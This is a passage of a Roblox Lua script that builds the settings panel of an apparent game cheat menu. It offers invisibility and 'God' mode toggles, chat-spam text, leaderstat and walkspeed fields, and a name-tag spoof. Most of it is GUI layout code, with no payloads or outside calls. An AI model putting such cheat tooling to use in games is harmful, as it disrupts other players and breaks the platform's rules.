pge1.ZIndex = 1

local pge2 = Instance.new("Frame")
pge2.Parent = page
pge2.BorderColor3 = rede
pge2.BackgroundColor3 = blak
pge2.BorderSizePixel = 3
pge2.Name = "Page2"
pge2.Position = UDim2.new(0,0,0,83)
pge2.Size = UDim2.new(1,0,1,-83)
pge2.ZIndex = 1
pge2.Visible = false
local lft = Instance.new("TextButton")
lft.Parent = page
lft.BorderColor3 = rede
lft.BackgroundColor3 = blak
lft.BorderSizePixel = 3
lft.Name = ">"
lft.Position = UDim2.new(0.5,3,0,40)
lft.Size = UDim2.new(0.5,-3,0,40)
lft.ZIndex = 1
lft.Font = tef
lft.FontSize = "Size48"
lft.Text = ">"
lft.TextColor3 = whit
lft.MouseButton1Down:connect(function()
	if pge1.Visible == true then
		pge1.Visible = false
		pge2.Visible = true
	elseif pge2.Visible == true then
		pge2.Visible = false
		pge1.Visible = true
	end	
end)
local rgt = Instance.new("TextButton")
rgt.Parent = page
rgt.BorderColor3 = rede
rgt.BackgroundColor3 = blak
rgt.BorderSizePixel = 3
rgt.Name = "<"
rgt.Position = UDim2.new(0,0,0,40)
rgt.Size = UDim2.new(0.5,0,0,40)
rgt.ZIndex = 1
rgt.Font = tef
rgt.FontSize = "Size48"
rgt.Text = "<"
rgt.TextColor3 = whit
rgt.MouseButton1Down:connect(function()
	if pge1.Visible == true then
		pge1.Visible = false
		pge2.Visible = true
	elseif pge2.Visible == true then
		pge2.Visible = false
		pge1.Visible = true
	end	
end)

local sbutton = Instance.new("TextButton")
sbutton.Parent = page
sbutton.BackgroundColor3 = blak
sbutton.BorderColor3 = rede
sbutton.BorderSizePixel = 3
sbutton.Name = "SettingsButton"
sbutton.Position = UDim2.new(1,3,0,0)
sbutton.Size = UDim2.new(0,27,1,0)
sbutton.Font = tef
sbutton.FontSize = "Size48"
sbutton.TextColor3 = whit
sbutton.Text = "<"
cango = true
sbutton.MouseButton1Down:connect(function()
	if cango == true then
		if sbutton.Text == "<" then
			sbutton.Text = ">"
			cango = false
			repeat
				wait()
				page.Position = UDim2.new(1,page.Position.X.Offset-10,0,0)
			until page.Position.X.Offset <= -293
			wait()
			page.Position = UDim2.new(1,-300,0,0)
			cango = true
		else
			sbutton.Text = "<"
			cango = false
			repeat
				wait()
				page.Position = UDim2.new(1,page.Position.X.Offset+10,0,0)
			until page.Position.X.Offset >= -10
			wait()
			page.Position = UDim2.new(1,3,0,0)
			cango = true
		end	
	end
end)
local title = Instance.new("TextLabel")
title.Parent = page
title.BackgroundColor3 = blak
title.BorderColor3 = rede
title.BorderSizePixel = 3
title.Name = "Title"
title.Position = UDim2.new(0,0,0,0)
title.Size = UDim2.new(1,0,0,40)
title.ZIndex = 1
title.Font = tef
title.FontSize = "Size24"
title.Text = "Settings"
title.TextColor3 = whit


local bgt = Instance.new("Frame")
bgt.Parent = pge1
bgt.BackgroundColor3 = blak
bgt.BorderColor3 = rede
bgt.BorderSizePixel = 3
bgt.Name = "Billboard Gui Text"
bgt.Position = UDim2.new(0.5,3,0,198)
bgt.Size = UDim2.new(0.5,-3,0,63)
local cgid = Instance.new("Frame")
cgid.Parent = pge1
cgid.BackgroundColor3 = blak
cgid.BorderColor3 = rede
cgid.BorderSizePixel = 3
cgid.Name = "Custom Gear ID"
cgid.Position = UDim2.new(0,0,0,198)
cgid.Size = UDim2.new(0.5,0,0,63)
local god = Instance.new("Frame")
god.Parent = pge1
god.BackgroundColor3 = blak
god.BorderColor3 = rede
god.BorderSizePixel = 3
god.Name = "God"
god.Position = UDim2.new(0,0,0,132)
god.Size = UDim2.new(0.5,0,0,63)
local Inv = Instance.new("Frame")
Inv.Parent = pge1
Inv.BackgroundColor3 = blak
Inv.BorderColor3 = rede
Inv.BorderSizePixel = 3
Inv.Name = "Invisibility"
Inv.Position = UDim2.new(0.5,3,0,132)
Inv.Size = UDim2.new(0.5,-3,0,63)
local mid = Instance.new("Frame")
mid.Parent = pge1
mid.BackgroundColor3 = blak
mid.BorderColor3 = rede
mid.BorderSizePixel = 3
mid.Name = "Music ID"
mid.Position = UDim2.new(0,0,0,66)
mid.Size = UDim2.new(0.5,0,0,63)
local mp = Instance.new("Frame")
mp.Parent = pge1
mp.BackgroundColor3 = blak
mp.BorderColor3 = rede
mp.BorderSizePixel = 3
mp.Name = "Music Pitch"
mp.Position = UDim2.new(0.5,3,0,66)
mp.Size = UDim2.new(0.5,-3,0,63)
local pi = Instance.new("Frame")
pi.Parent = pge1
pi.BackgroundColor3 = blak
pi.BorderColor3 = rede
pi.BorderSizePixel = 3
pi.Name = "Place ID"
pi.Position = UDim2.new(0.5,3,0,0)
pi.Size = UDim2.new(0.5,-3,0,63)
local sdi = Instance.new("Frame")
sdi.Parent = pge1
sdi.BackgroundColor3 = blak
sdi.BorderColor3 = rede
sdi.BorderSizePixel = 3
sdi.Name = "Skybox/Decal ID"
sdi.Position = UDim2.new(0,0,0,0)
sdi.Size = UDim2.new(0.5,0,0,63)
local textbx = Instance.new("TextBox")
textbx.Parent = sdi
textbx.BackgroundColor3 = blak
textbx.BorderColor3 = rede
textbx.BorderSizePixel = 3 
textbx.ClearTextOnFocus = true
textbx.Position = UDim2.new(0,0,0.5,0)
textbx.Size = UDim2.new(0.99,1,0.5,-1)
textbx.Font = tef
textbx.FontSize = "Size14"
textbx.Text = "158118263"
textbx.TextColor3 = whit
local titl = Instance.new("TextLabel")
titl.Parent = sdi
titl.BackgroundColor3 = blak
titl.BorderColor3 = rede
titl.BorderSizePixel = 3
titl.Name = "Title"
titl.Size = UDim2.new(1,0,0,30)
titl.Font = tef.."Bold"
titl.FontSize = "Size14"
titl.Text = "Skybox/Decal ID"
titl.TextColor3 = whit
local textbx = Instance.new("TextBox")
textbx.Parent = pi
textbx.BackgroundColor3 = blak
textbx.BorderColor3 = rede
textbx.BorderSizePixel = 3 
textbx.ClearTextOnFocus = true
textbx.Position = UDim2.new(0,0,0.5,0)
textbx.Size = UDim2.new(0.99,1,0.5,-1)
textbx.Font = tef
textbx.FontSize = "Size14"
textbx.Text = "149559312"
textbx.TextColor3 = whit
local titl = Instance.new("TextLabel")
titl.Parent = pi
titl.BackgroundColor3 = blak
titl.BorderColor3 = rede
titl.BorderSizePixel = 3
titl.Name = "Title"
titl.Size = UDim2.new(1,0,0,30)
titl.Font = tef.."Bold"
titl.FontSize = "Size14"
titl.Text = "Place ID"
titl.TextColor3 = whit
local textbx = Instance.new("TextBox")
textbx.Parent = mp
textbx.BackgroundColor3 = blak
textbx.BorderColor3 = rede
textbx.BorderSizePixel = 3 
textbx.ClearTextOnFocus = true
textbx.Position = UDim2.new(0,0,0.5,0)
textbx.Size = UDim2.new(0.99,1,0.5,-1)
textbx.Font = tef
textbx.FontSize = "Size14"
textbx.Text = "1"
textbx.TextColor3 = whit
local titl = Instance.new("TextLabel")
titl.Parent = mp
titl.BackgroundColor3 = blak
titl.BorderColor3 = rede
titl.BorderSizePixel = 3
titl.Name = "Title"
titl.Size = UDim2.new(1,0,0,30)
titl.Font = tef.."Bold"
titl.FontSize = "Size14"
titl.Text = "Music Pitch"
titl.TextColor3 = whit
local textbx = Instance.new("TextBox")
textbx.Parent = mid
textbx.BackgroundColor3 = blak
textbx.BorderColor3 = rede
textbx.BorderSizePixel = 3 
textbx.ClearTextOnFocus = true
textbx.Position = UDim2.new(0,0,0.5,0)
textbx.Size = UDim2.new(0.99,1,0.5,-1)
textbx.Font = tef
textbx.FontSize = "Size14"
textbx.Text = "142930454"
textbx.TextColor3 = whit
local titl = Instance.new("TextLabel")
titl.Parent = mid
titl.BackgroundColor3 = blak
titl.BorderColor3 = rede
titl.BorderSizePixel = 3
titl.Name = "Title"
titl.Size = UDim2.new(1,0,0,30)
titl.Font = tef.."Bold"
titl.FontSize = "Size14"
titl.Text = "Music ID"
titl.TextColor3 = whit
local textbx = Instance.new("TextBox")
textbx.Parent = cgid
textbx.BackgroundColor3 = blak
textbx.BorderColor3 = rede
textbx.BorderSizePixel = 3 
textbx.ClearTextOnFocus = true
textbx.Position = UDim2.new(0,0,0.5,0)
textbx.Size = UDim2.new(0.99,1,0.5,-1)
textbx.Font = tef
textbx.FontSize = "Size14"
textbx.Text = "108149175"
textbx.TextColor3 = whit
local titl = Instance.new("TextLabel")
titl.Parent = cgid
titl.BackgroundColor3 = blak
titl.BorderColor3 = rede
titl.BorderSizePixel = 3
titl.Name = "Title"
titl.Size = UDim2.new(1,0,0,30)
titl.Font = tef.."Bold"
titl.FontSize = "Size14"
titl.Text = "Custom Gear ID"
titl.TextColor3 = whit
local textbx = Instance.new("TextBox")
textbx.Parent = bgt
textbx.BackgroundColor3 = blak
textbx.BorderColor3 = rede
textbx.BorderSizePixel = 3 
textbx.ClearTextOnFocus = true
textbx.Position = UDim2.new(0,0,0.5,0)
textbx.Size = UDim2.new(0.99,1,0.5,-1)
textbx.Font = tef
textbx.FontSize = "Size14"
textbx.Text = "a00bdy00lan"
textbx.TextColor3 = whit
local titl = Instance.new("TextLabel")
titl.Parent = bgt
titl.BackgroundColor3 = blak
titl.BorderColor3 = rede
titl.BorderSizePixel = 3
titl.Name = "Title"
titl.Size = UDim2.new(1,0,0,30)
titl.Font = tef.."Bold"
titl.FontSize = "Size14"
titl.Text = "Billboard Gui Text"
titl.TextColor3 = whit
titl.TextWrapped = true

local button = Instance.new("TextButton")
button.Parent = Inv
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3 
button.Position = UDim2.new(0,0,0.5,0)
button.Size = UDim2.new(0.99,1,0.5,-1)
button.Font = tef
button.FontSize = "Size14"
button.Text = "On"
button.TextColor3 = whit
button.MouseButton1Down:connect(function()
	if button.Text == "Off" then
		game.Players.LocalPlayer.Character.Head.Transparency = 1
		game.Players.LocalPlayer.Character.Head.face.Transparency = 1
		game.Players.LocalPlayer.Character.Torso.Transparency = 1
		game.Players.LocalPlayer.Character["Right Arm"].Transparency = 1
		game.Players.LocalPlayer.Character["Left Arm"].Transparency = 1
		game.Players.LocalPlayer.Character["Right Leg"].Transparency = 1
		game.Players.LocalPlayer.Character["Left Leg"].Transparency = 1
		button.Text = "On"
	else
		game.Players.LocalPlayer.Character.Head.Transparency = 0
		game.Players.LocalPlayer.Character.Head.face.Transparency = 0
		game.Players.LocalPlayer.Character.Torso.Transparency = 0
		game.Players.LocalPlayer.Character["Right Arm"].Transparency = 0
		game.Players.LocalPlayer.Character["Left Arm"].Transparency = 0
		game.Players.LocalPlayer.Character["Right Leg"].Transparency = 0
		game.Players.LocalPlayer.Character["Left Leg"].Transparency = 0
		button.Text = "Off"
	end
end)
local titl = Instance.new("TextLabel")
titl.Parent = Inv
titl.BackgroundColor3 = blak
titl.BorderColor3 = rede
titl.BorderSizePixel = 3
titl.Name = "Title"
titl.Size = UDim2.new(1,0,0,30)
titl.Font = tef.."Bold"
titl.FontSize = "Size14"
titl.Text = "Invisibility"
titl.TextColor3 = whit
titl.TextWrapped = true
local button = Instance.new("TextButton")
button.Parent = god
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3 
button.Position = UDim2.new(0,0,0.5,0)
button.Size = UDim2.new(0.99,1,0.5,-1)
button.Font = tef
button.FontSize = "Size14"
button.Text = "On"
button.TextColor3 = whit
button.MouseButton1Down:connect(function()
	if button.Text == "Off" then
		game.Players.LocalPlayer.Character.Humanoid.MaxHealth = math.huge
		game.Players.LocalPlayer.Character.Humanoid.Health = math.huge
		button.Text = "On"
	else
		game.Players.LocalPlayer.Character.Humanoid.MaxHealth = 100
		game.Players.LocalPlayer.Character.Humanoid.Health = 100
		button.Text = "Off"
	end
end)
local titl = Instance.new("TextLabel")
titl.Parent = god
titl.BackgroundColor3 = blak
titl.BorderColor3 = rede
titl.BorderSizePixel = 3
titl.Name = "Title"
titl.Size = UDim2.new(1,0,0,30)
titl.Font = tef.."Bold"
titl.FontSize = "Size14"
titl.Text = "God"
titl.TextColor3 = whit
titl.TextWrapped = true		
--Page 2--
local arr = Instance.new("Frame")
arr.Parent = pge2
arr.BackgroundColor3 = blak
arr.BorderColor3 = rede
arr.BorderSizePixel = 3
arr.Name = "Anti Robloxian Range"
arr.Position = UDim2.new(0.5,3,0,198)
arr.Size = UDim2.new(0.5,-3,0,63)
local bgc = Instance.new("Frame")
bgc.Parent = pge2
bgc.BackgroundColor3 = blak
bgc.BorderColor3 = rede
bgc.BorderSizePixel = 3
bgc.Name = "Billboard Gui Color"
bgc.Position = UDim2.new(0,0,0,198)
bgc.Size = UDim2.new(0.5,0,0,63)
local cst = Instance.new("Frame")
cst.Parent = pge2
cst.BackgroundColor3 = blak
cst.BorderColor3 = rede
cst.BorderSizePixel = 3
cst.Name = "Chat Spam Text"
cst.Position = UDim2.new(0,0,0,132)
cst.Size = UDim2.new(0.5,0,0,63)
local lsa = Instance.new("Frame")
lsa.Parent = pge2
lsa.BackgroundColor3 = blak
lsa.BorderColor3 = rede
lsa.BorderSizePixel = 3
lsa.Name = "Leaderstat Amount"
lsa.Position = UDim2.new(0.5,3,0,132)
lsa.Size = UDim2.new(0.5,-3,0,63)
local lsn = Instance.new("Frame")
lsn.Parent = pge2
lsn.BackgroundColor3 = blak
lsn.BorderColor3 = rede
lsn.BorderSizePixel = 3
lsn.Name = "Leaderstat Name"
lsn.Position = UDim2.new(0,0,0,66)
lsn.Size = UDim2.new(0.5,0,0,63)
local nmb = Instance.new("Frame")
nmb.Parent = pge2
nmb.BackgroundColor3 = blak
nmb.BorderColor3 = rede
nmb.BorderSizePixel = 3
nmb.Name = "Name Box"
nmb.Position = UDim2.new(0.5,3,0,66)
nmb.Size = UDim2.new(0.5,-3,0,63)



local wsa = Instance.new("Frame")
wsa.Parent = pge2
wsa.BackgroundColor3 = blak
wsa.BorderColor3 = rede
wsa.BorderSizePixel = 3
wsa.Name = "Walkspeed Amount"
wsa.Position = UDim2.new(0.5,3,0,0)
wsa.Size = UDim2.new(0.5,-3,0,63)


local textbx = Instance.new("TextBox")
textbx.Parent = arr
textbx.BackgroundColor3 = blak
textbx.BorderColor3 = rede
textbx.BorderSizePixel = 3 
textbx.ClearTextOnFocus = true
textbx.Position = UDim2.new(0,0,0.5,0)
textbx.Size = UDim2.new(0.99,1,0.5,-1)
textbx.Font = tef
textbx.FontSize = "Size14"
textbx.Text = "4"
textbx.TextColor3 = whit
local titl = Instance.new("TextLabel")
titl.Parent = arr
titl.BackgroundColor3 = blak
titl.BorderColor3 = rede
titl.BorderSizePixel = 3
titl.Name = "Title"
titl.Size = UDim2.new(1,0,0,30)
titl.Font = tef.."Bold"
titl.FontSize = "Size14"
titl.Text = "Anti Robloxian Rage"
titl.TextColor3 = whit
titl.TextWrapped = true
textbx1 = Instance.new("TextBox")
textbx1.Parent = bgc
textbx1.BackgroundColor3 = blak
textbx1.BorderColor3 = rede
textbx1.BorderSizePixel = 3 
textbx1.ClearTextOnFocus = true
textbx1.Position = UDim2.new(0,0,0.5,0)
textbx1.Size = UDim2.new(0,50,0.5,-1)
textbx1.Font = tef
textbx1.FontSize = "Size14"
textbx1.Text = "200"
textbx1.TextColor3 = whit
textbx1.Name = "TextBox1"
textbx2 = Instance.new("TextBox")
textbx2.Parent = bgc
textbx2.BackgroundColor3 = blak
textbx2.BorderColor3 = rede
textbx2.BorderSizePixel = 3 
textbx2.ClearTextOnFocus = true
textbx2.Position = UDim2.new(0,50,0.5,0)
textbx2.Size = UDim2.new(0,50,0.5,-1)
textbx2.Font = tef
textbx2.FontSize = "Size14"
textbx2.Text = "0"
textbx2.TextColor3 = whit
textbx2.Name = "TextBox2"
textbx3 = Instance.new("TextBox")
textbx3.Parent = bgc
textbx3.BackgroundColor3 = blak
textbx3.BorderColor3 = rede
textbx3.BorderSizePixel = 3 
textbx3.ClearTextOnFocus = true
textbx3.Position = UDim2.new(0,100,0.5,0)
textbx3.Size = UDim2.new(0,50,0.5,-1)
textbx3.Font = tef
textbx3.FontSize = "Size14"
textbx3.Text = "0"
textbx3.TextColor3 = whit
textbx3.Name = "TextBox3"
local titl = Instance.new("TextLabel")
titl.Parent = bgc
titl.BackgroundColor3 = blak
titl.BorderColor3 = rede
titl.BorderSizePixel = 3
titl.Name = "Title"
titl.Size = UDim2.new(1,0,0,30)
titl.Font = tef.."Bold"
titl.FontSize = "Size14"
titl.Text = "Billboard Gui Color"
titl.TextColor3 = whit
titl.TextWrapped = true		
local textbx = Instance.new("TextBox")
textbx.Parent = cst
textbx.BackgroundColor3 = blak
textbx.BorderColor3 = rede
textbx.BorderSizePixel = 3 
textbx.ClearTextOnFocus = true
textbx.Position = UDim2.new(0,0,0.5,0)
textbx.Size = UDim2.new(0.99,1,0.5,-1)
textbx.Font = tef
textbx.FontSize = "Size14"
textbx.Text = "just stop hacking!"
textbx.TextColor3 = whit
local titl = Instance.new("TextLabel")
titl.Parent = cst
titl.BackgroundColor3 = blak
titl.BorderColor3 = rede
titl.BorderSizePixel = 3
titl.Name = "Title"
titl.Size = UDim2.new(1,0,0,30)
titl.Font = tef.."Bold"
titl.FontSize = "Size14"
titl.Text = "Chat Spam Text"
titl.TextColor3 = whit
titl.TextWrapped = true
local textbx = Instance.new("TextBox")
textbx.Parent = lsa
textbx.BackgroundColor3 = blak
textbx.BorderColor3 = rede
textbx.BorderSizePixel = 3 
textbx.ClearTextOnFocus = true
textbx.Position = UDim2.new(0,0,0.5,0)
textbx.Size = UDim2.new(0.99,1,0.5,-1)
textbx.Font = tef
textbx.FontSize = "Size14"
textbx.Text = "50"
textbx.TextColor3 = whit
local titl = Instance.new("TextLabel")
titl.Parent = lsa
titl.BackgroundColor3 = blak
titl.BorderColor3 = rede
titl.BorderSizePixel = 3
titl.Name = "Title"
titl.Size = UDim2.new(1,0,0,30)
titl.Font = tef.."Bold"
titl.FontSize = "Size14"
titl.Text = "Leaderstat Amount"
titl.TextColor3 = whit
titl.TextWrapped = true
local textbx = Instance.new("TextBox")
textbx.Parent = lsn
textbx.BackgroundColor3 = blak
textbx.BorderColor3 = rede
textbx.BorderSizePixel = 3 
textbx.ClearTextOnFocus = true
textbx.Position = UDim2.new(0,0,0.5,0)
textbx.Size = UDim2.new(0.99,1,0.5,-1)
textbx.Font = tef
textbx.FontSize = "Size14"
textbx.Text = "KOs"
textbx.TextColor3 = whit
local titl = Instance.new("TextLabel")
titl.Parent = lsn
titl.BackgroundColor3 = blak
titl.BorderColor3 = rede
titl.BorderSizePixel = 3
titl.Name = "Title"
titl.Size = UDim2.new(1,0,0,30)
titl.Font = tef.."Bold"
titl.FontSize = "Size14"
titl.Text = "Leaderstat Name"
titl.TextColor3 = whit
titl.TextWrapped = true
local titl = Instance.new("TextLabel")
titl.Parent = nmb
titl.BackgroundColor3 = blak
titl.BorderColor3 = rede
titl.BorderSizePixel = 3
titl.Name = "Title"
titl.Size = UDim2.new(1,0,0,30)
titl.Font = tef.."Bold"
titl.FontSize = "Size14"
titl.Text = "Name"
titl.TextColor3 = whit
titl.TextWrapped = true
local textbxx = Instance.new("TextBox",nmb)
textbxx.BackgroundColor3 = blak
textbxx.BorderColor3 = rede
textbxx.BorderSizePixel = 3 
textbxx.ClearTextOnFocus = true
textbxx.Position = UDim2.new(0,0,0.5,0)
textbxx.Size = UDim2.new(0.99,1,0.5,-1)
textbxx.Font = tef
textbxx.FontSize = "Size14"
textbxx.Text = "God"
textbxx.TextColor3 = whit

local button = Instance.new("TextButton")
button.Parent = localp
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Change Name"
button.Position = UDim2.new(0,0,0,66)
button.Size = UDim2.new(0.5,0,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Change Name"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()
	for a, mod in pairs(game.Players.LocalPlayer.Character:children()) do
		if mod:FindFirstChild("TAG") then
			game.Players.LocalPlayer.Character.Head.Transparency = 0
			mod:Destroy()
		end
	end

	local char = game.Players.LocalPlayer.Character
	local model = Instance.new("Model", char)
	local clone = char.Head:Clone()
	local hum = Instance.new("Humanoid", model)
	local weld = Instance.new("Weld", clone)
	model.Name =textbxx.Text
	clone.Parent = model
	hum.Name = "TAG"
	hum.MaxHealth = 100
	hum.Health = 100
	weld.Part0 = clone
	weld.Part1 = char.Head
	char.Head.Transparency = 1
end)

local textbx = Instance.new("TextBox")
textbx.Parent = wsa
textbx.BackgroundColor3 = blak
textbx.BorderColor3 = rede
textbx.BorderSizePixel = 3 
textbx.ClearTextOnFocus = true
textbx.Position = UDim2.new(0,0,0.5,0)
textbx.Size = UDim2.new(0.99,1,0.5,-1)
textbx.Font = tef
textbx.FontSize = "Size14"
textbx.Text = "50"
textbx.TextColor3 = whit
local titl = Instance.new("TextLabel")
titl.Parent = wsa
titl.BackgroundColor3 = blak
titl.BorderColor3 = rede
titl.BorderSizePixel = 3
titl.Name = "Title"
titl.Size = UDim2.new(1,0,0,30)
titl.Font = tef.."Bold"
titl.FontSize = "Size14"
titl.Text = "Walkspeed Amount"
titl.TextColor3 = whit
titl.TextWrapped = true
--Settings--

-----------------------------------------------------------------------------
--Important Script to make tabs work! DONT TOUCH--
CurrentPage = 1

function FlipPage(Way)
	local NewPage = CurrentPage+Way
	if pges:findFirstChild("Page"..NewPage)~=nil then
		CurrentPage = NewPage
		local P = pges:GetChildren()
		for i = 1, #P do
			P[i].Visible = false
		end
		pges:findFirstChild("Page"..NewPage).Visible = true
	end
end
right.MouseButton1Down:connect(function()FlipPage(1) end)
left.MouseButton1Down:connect(function()FlipPage(-1) end)
page1.addonl.MouseButton1Down:connect(function()CurrentPage=6 FlipPage(-1) end)
page5.addonr.MouseButton1Down:connect(function()CurrentPage=0 FlipPage(1) end)
-----------------------------------------------------------------------------
